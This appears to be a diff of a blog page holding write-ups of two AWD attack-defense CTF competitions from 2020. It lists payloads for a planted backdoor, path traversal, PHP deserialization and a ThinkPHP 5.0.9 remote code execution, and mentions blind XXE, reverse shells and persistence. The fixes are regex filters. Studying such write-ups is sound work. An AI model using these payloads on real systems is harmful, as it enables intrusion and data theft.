@@ -6,16 +6,16 @@
   <meta name="author" content="FengHLZ">
   
   
-  <title>2020.2.9星盟AWD邀请赛复盘 | xyz|All</title>
+  <title>星盟AWD系列邀请赛复盘 | xyz|All</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="AWD,">
+    <meta name="keywords" content="AWD,星盟,AWD,">
   
 
   
-  <meta name="description" content="感谢星盟安全团队的再一次邀请！">
+  <meta name="description" content="感谢星盟安全团队的邀请！">
 
   
 
@@ -82,6 +82,8 @@
       
         <a href="/archives/" target="_self">归档</a>
       
+        <a href="/tags/" target="_self">标签</a>
+      
         <a href="/categories/" target="_self">分类</a>
       
         <a href="/friends/" target="_self">友链</a>
@@ -121,18 +123,18 @@
     
   </div>
   <h1 class="passage-title">
-    2020.2.9星盟AWD邀请赛复盘
+    星盟AWD系列邀请赛复盘
   </h1>
   
   <article class="passage-article">
-    <p>星盟安全团队举办的线上AWD，三道Web题，两道pwn题。又学到了很多新姿势。</p>
+    <h2 id="2-9"><a href="#2-9" class="headerlink" title="2.9"></a>2.9</h2><p>2月9号星盟安全团队举办的线上AWD，三道Web题，两道pwn题。又学到了很多新姿势。</p>
 <p>记录下三道Web题中我们发现的漏洞和做题过程。</p>
-<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>上D盾：</p>
+<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>上D盾：</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220003.png" alt></p>
-<h3 id="test-php中的预置后门："><a href="#test-php中的预置后门：" class="headerlink" title="test.php中的预置后门："></a><code>test.php</code>中的预置后门：</h3><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220253.png" alt></p>
+<h4 id="test-php中的预置后门："><a href="#test-php中的预置后门：" class="headerlink" title="test.php中的预置后门："></a><code>test.php</code>中的预置后门：</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220253.png" alt></p>
 <p>赶紧<strong>删文件</strong>，写个脚本批量打。</p>
 <p><strong>payload</strong>：<code>http://39.100.119.37:10480/test.php?out=cat /flag</code></p>
-<h3 id="shell-函数的命令执行漏洞"><a href="#shell-函数的命令执行漏洞" class="headerlink" title="shell()函数的命令执行漏洞"></a>shell()函数的命令执行漏洞</h3><p>在<code>admin/func.php</code>中存在有漏洞的<code>shell</code>函数：</p>
+<h4 id="shell-函数的命令执行漏洞"><a href="#shell-函数的命令执行漏洞" class="headerlink" title="shell()函数的命令执行漏洞"></a>shell()函数的命令执行漏洞</h4><p>在<code>admin/func.php</code>中存在有漏洞的<code>shell</code>函数：</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220549.png" alt></p>
 <p><strong>如何快速发现哪个文件调用了shell函数</strong>？</p>
 <p>熟悉代码审计的师傅应该知道<code>ctags</code>和<code>在文件夹中搜索</code>这两个功能。</p>
@@ -154,23 +156,23 @@
 <p><strong>修复方案</strong>：过滤out参数，如果其含有flag字样，直接<code>exit();</code>（这样不严谨，但当时时间紧迫，先这样处理）</p>
 <p>更好的修复方案，shell完成的功能是<code>ping</code>命令，那么我们就使用正则来过滤输入的参数是否是正常的域名或者IP</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure>
-<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="假的预置后门"><a href="#假的预置后门" class="headerlink" title="假的预置后门"></a>假的预置后门</h3><p>同Web1一样，在网站根目录下有一个<code>test.php</code>的假后门</p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h4 id="假的预置后门"><a href="#假的预置后门" class="headerlink" title="假的预置后门"></a>假的预置后门</h4><p>同Web1一样，在网站根目录下有一个<code>test.php</code>的假后门</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221725.png" alt></p>
 <p>一开始D盾扫到还挺兴奋的，但利用起来完全没作用</p>
 <p>源码中已经输出了<code>$_</code>、<code>$__</code>、<code>$___</code>的值，跟注释中的<code>$_=&#39;assert&#39;;</code>完全不一样，大概就是出题人皮了一下。</p>
 <p>pass掉。</p>
-<h3 id="目录跳转漏洞"><a href="#目录跳转漏洞" class="headerlink" title="目录跳转漏洞"></a>目录跳转漏洞</h3><p><code>admin/grade.php</code>中，接收文件名，并将文件内容输出到浏览器</p>
+<h4 id="目录跳转漏洞"><a href="#目录跳转漏洞" class="headerlink" title="目录跳转漏洞"></a>目录跳转漏洞</h4><p><code>admin/grade.php</code>中，接收文件名，并将文件内容输出到浏览器</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222506.png" alt></p>
 <p><strong>payload</strong>：<code>http://39.100.119.37:21680/admin/grade.php?file=../../../../flag</code></p>
 <p><strong>修复方案</strong>：正则匹配<code>..</code>，防止目录遍历</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222935.png" alt></p>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><code>login/logout.php</code></p>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p><code>login/logout.php</code></p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209223250.png" alt></p>
 <p>比较简单的反序列化利用</p>
 <p><strong>payload</strong>：<code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:4:&quot;male&quot;;s:15:&quot;system(&#39;cat /flag&#39;);&quot;;}</code></p>
 <p><strong>修复方案</strong>：多余的操作，直接删除<code>unserialize($_POST[&#39;un&#39;]);</code></p>
-<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>Web3的MySQL服务一直有问题，直到比赛结束前半个小时才恢复。</p>
-<h3 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h3><p><code>loginCheck.php</code></p>
+<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>Web3的MySQL服务一直有问题，直到比赛结束前半个小时才恢复。</p>
+<h4 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h4><p><code>loginCheck.php</code></p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209230947.png" alt></p>
 <p>登录是通过XML传递<code>username</code>和<code>password</code>参数，而传递的xml我们可控，没有回显，盲XXE读取文件。</p>
 <p>XML：</p>
@@ -183,13 +185,44 @@
 <p>VPS接收到请求：</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231654.png" alt></p>
 <p>关于盲XXE更多参考学习：<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>赛后在群里看了下其他师傅分享的思路，不得不服，被骚到了。。最重要的还是权限维持。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>赛后在群里看了下其他师傅分享的思路，不得不服，被骚到了。。最重要的还是权限维持。</p>
 <p>骚思路：</p>
 <p>建立<code>软链接文件</code>到<code>/flag</code></p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209232517.png" alt></p>
 <p>还有发现平台漏洞，拿到所有主机的登录密码：</p>
 <p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200210144759.jpg" alt></p>
 <p>太强了，向师傅们学习！</p>
+<h2 id="3-14"><a href="#3-14" class="headerlink" title="3.14"></a>3.14</h2><p>特别感谢星盟安全团队3月的AWD邀请赛！</p>
+<p>这次我们团队有几个选手因为有事耽误了，没有参加，导致我们人手不太够。后面环境也出现了不同程度的问题：环境经常崩、无法重置容器等。不过还是特别感谢星盟安全团队，辛苦运维小哥们了！</p>
+<h3 id="Web2-1"><a href="#Web2-1" class="headerlink" title="Web2"></a>Web2</h3><p>Web2是最先开放环境的</p>
+<h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>拷贝源码到本地 -&gt; 上日志监控脚本 -&gt; 上文件监控脚本等等</p>
+<h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><p>直接访问<code>login.php</code>，左下角就存在flag</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314231159.png" alt></p>
+<h4 id="登录login-php"><a href="#登录login-php" class="headerlink" title="登录login.php"></a>登录login.php</h4><p>很多队伍没有修改默认登录账号密码，导致默认登录后拿到flag</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314231321.png" alt></p>
+<p>主要就是这两个洞在这刷，由于今天人手不太够，也没有怎么维持权限。</p>
+<h3 id="Web3-1"><a href="#Web3-1" class="headerlink" title="Web3"></a>Web3</h3><p>Web3的洞挺多的，就是环境问题导致几个洞用不了，也可能是我们操作不当。</p>
+<h4 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h4><p>首先前期准备工作做好，源码拷贝下来后发现存在<code>readme.md</code>，我还以为是在GitHub上下载的某个cms，就没有打开这个<code>readme</code>。后来D盾扫到了这个文件存在危险函数，一看，一句话木马。。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232108.png" alt></p>
+<p>傻傻的还以为要寻找文件包含漏洞，要是找到了文件包含，这个文件也早被删了。。知道看到<code>.htaccess</code>的内容，原来可以直接用！赶紧刷一波（很快就没了）</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232137.png" alt></p>
+<h4 id="命令执行-反序列化"><a href="#命令执行-反序列化" class="headerlink" title="命令执行 反序列化"></a>命令执行 反序列化</h4><p><code>common</code>目录中的<code>function.php</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232401.png" alt></p>
+<p>先把自己的洞给修了，采用正则来匹配输入的是否是合法的IP/域名：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure>
+<p>结果去利用别人的洞的时候，发现怎么使都不成功，试了很多队伍，一致以为是环境问题导致的PHP脚本没有正常执行。。</p>
+<p>同目录下 <code>home.php</code> 中存在反序列化漏洞。感觉和上次（2月）的题目很像啊。。</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232725.png" alt></p>
+<h3 id="Web1-1"><a href="#Web1-1" class="headerlink" title="Web1"></a>Web1</h3><p>Web1是黑盒测试，比赛大概进行了半个小时放出Web1的环境。</p>
+<p>一上来随便一测，就是个TP环境，报错看下TP版本：<code>5.0.9</code>，直接RCE：</p>
+<p><code>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=more%20/flag</code></p>
+<p>一开始试的<code>cat /flag</code>，好像返回结果有点问题，就换成了<code>more</code>。</p>
+<p>当时没有怎么想着维持权限，只是反弹一个自己团队shell，把洞给修了。</p>
+<p>下次遇到这种黑盒的，就直接拿到所有队伍的<code>meterpreter shell</code>，放在后台，这样维权比较方便长久。（希望不会卡。。）</p>
+<p>后来莫名访问量<code>.config.php</code>，没想到直接骑上别人的马了，同网站根目录下的<code>jquery.min.js</code>一样，这两个都是软链接文件，链接到<code>/flag</code>。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这次的比赛准备的挺充足的，赛前我也调试过几个通防脚本。只不过有些脚本的作用还是没有充分发挥。</p>
+<p>比赛人手不够也导致很被动，，</p>
+<p>总之，很感谢星盟安全团队这次锻炼的机会！我们还需要更加努力。</p>
   </article>
   <aside class="table-content" id="site-toc">
   <div class="table-content-title">
@@ -197,7 +230,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1"><span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#test-php中的预置后门："><span class="toc-text">test.php中的预置后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-函数的命令执行漏洞"><span class="toc-text">shell()函数的命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web2"><span class="toc-text">Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#假的预置后门"><span class="toc-text">假的预置后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录跳转漏洞"><span class="toc-text">目录跳转漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web3"><span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲XXE"><span class="toc-text">盲XXE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9"><span class="toc-text">2.9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1"><span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#test-php中的预置后门："><span class="toc-text">test.php中的预置后门：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell-函数的命令执行漏洞"><span class="toc-text">shell()函数的命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2"><span class="toc-text">Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#假的预置后门"><span class="toc-text">假的预置后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#目录跳转漏洞"><span class="toc-text">目录跳转漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反序列化"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3"><span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#盲XXE"><span class="toc-text">盲XXE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-14"><span class="toc-text">3.14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2-1"><span class="toc-text">Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#前期准备"><span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login-php"><span class="toc-text">login.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#登录login-php"><span class="toc-text">登录login.php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3-1"><span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readme"><span class="toc-text">readme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令执行-反序列化"><span class="toc-text">命令执行 反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1-1"><span class="toc-text">Web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-1"><span class="toc-text">总结</span></a></li></ol></li></ol>
   </div>
 </aside>
   
@@ -206,7 +239,7 @@
       
         <div>
           原文链接: 
-          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-2-9-2020-2-9星盟AWD邀请赛复盘/</a>
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-2-9-星盟AWD系列邀请赛复盘/</a>
         </div>
       
       <div>
@@ -214,6 +247,14 @@
       </div>
     </aside>
   
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/星盟/"><i class="fa fa-tags"></i>星盟</a>
+     
+      <a href="/tags/AWD/"><i class="fa fa-tags"></i>AWD</a>
+    
+    </div>
   
 </div>
 
